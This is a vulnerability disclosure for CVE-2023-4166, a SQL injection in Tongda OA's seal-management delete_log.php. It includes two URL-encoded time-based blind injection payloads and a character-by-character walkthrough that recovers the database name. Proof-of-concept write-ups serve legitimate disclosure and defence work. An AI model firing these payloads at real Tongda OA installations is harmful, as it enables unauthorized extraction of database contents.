# CVE-2023-4166

SQL injection vulnerability exists in the oa foreground

official website:https://www.tongda2000.com/

version:Earlier than v11.10 or v2017

route:general/system/seal_manage/dianju/delete_log.php

injection parameter:$DELETE_STR

## 来源

[https://github.com/Das1yGa0/cve](https://github.com/Das1yGa0/cve)

## 简介

通达OA中存在SQL注入漏洞，攻击者通过该漏洞可以获取数据库中的敏感信息。

## 影响范围

-   通达OA < v11.10
-   通达OA < v2017

## 漏洞类型

SQL注入

## 漏洞分析

![WPS图片(1)](./images/255399107-880764f4-eb7c-45e3-ad74-78a7640dbed8.png)

We can use Cartesian product blind injection, the following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. ascii 116 also corresponds to the lowercase letter t. In this way, the database name and any database information can be obtained through blind injection.

poc

```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![WPS图片(2)](./images/255399268-c329b7d4-1692-40e3-9c7d-32256fc90327.png)
And we're going to change 116 to 115 so there's no delay, so there's SQL injection

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![WPS图片(3)](./images/255399443-36a57649-7e0b-446a-925d-68c0d9b24bc5.png)

The second part of the database is intercepted by blind injection, and the second part is identified as the letter d by the delay time
![WPS图片(4)](./images/255399852-56ede9c2-fc8e-4a03-ba4f-cecd002a4a52.png)

The third bit is a character

![WPS图片(5)](./images/255399981-0130a3d3-fdd4-470b-86b4-f5702a700ba6.png)

The fourth bit is the character o

![WPS图片(6)](./images/255400058-3d59e800-a8e4-464e-880c-e90eaf49ec6b.png)

The fifth digit is the character a

![WPS图片(7)](./images/255400079-7a86ae1e-653b-444b-822e-5e78636a0bbe.png)

Then the database name can be determined by blind injection :td_oa
